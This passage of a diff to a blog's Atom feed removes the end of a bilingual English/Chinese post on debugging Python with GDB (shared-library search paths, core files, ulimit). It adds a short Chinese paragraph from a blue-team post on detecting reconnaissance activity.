-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.so&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;do
-    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dirname&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;uniq&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;n : | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s#\./#'&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PWD&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'#g'&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;And then …&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;然後 …&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) set solib-search-path &amp;lt;the above output&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;As always, you should ensure these are the same versions that you’re running or that may be referenced in a core.&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;如同平常一樣，你需要確定這些正在執行的版本與產生的版本一致。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;what-if-i-have-a-core-file--如果我有一個-core-檔-&quot;&gt;What if I Have a Core File? / 如果我有一個 core 檔 ?&lt;/h3&gt;
-
-&lt;p&gt;You’ll use it like you would with any other debug session:&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;你可以如同使用其他 debug session 一樣：&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb -c &amp;lt;core&amp;gt; /usr/bin/python
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;All of the standard commands should work at that point: up, down, select, frame, etc…&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;所有的標準命令應該正常運作: up, down, select, frame 等等&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;how-do-i-get-a-core-file---我要怎麼得到一個-core-檔案-&quot;&gt;How do I Get a Core File ? / 我要怎麼得到一個 core 檔案 ?&lt;/h3&gt;
-
-&lt;p&gt;You can force a binary to drop a core by ensuring that the ulimit is set appropriately via ulimit -Sc unlimited. If your core files aren’t where you expect, see man core.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;只要將 ulimit 設定得當，透過 &lt;code class=&quot;highlighter-rouge&quot;&gt;ulimit -Sc unlimited&lt;/code&gt;，就可以強迫一個二進制檔案生成一個 core。如果你的 core 檔案不是你所預期的，請參照 man core(編按: man 是Linux 下的 mannual)。&lt;/p&gt;
-&lt;/blockquote&gt;</content><author><name>jhe</name></author><category term="python" /><category term="gdb" /><summary type="html">Debugging Your Python With GDB (FTW!) 編按：具體文章已遺失，透過網路找到 cache 文章來翻譯</summary></entry></feed>
+&lt;p&gt;雖然在殺戮鏈 (kill chain）中有更多收益較高的機會可以進一步檢測攻擊者的活動，但我們認為檢測偵察活動不應該被忽視。偵察自己的網路，並由攻擊者觀點來獲得潛在弱點。網路結構本該規劃成可監控關鍵的內部網路和系統，並將偵查工作集中在那裡。從自我偵查開始，並以此持續優化您個人的高保真度特徵值。&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="recon" /><summary type="html">Blue Team：檢測偵察活動</summary></entry></feed>
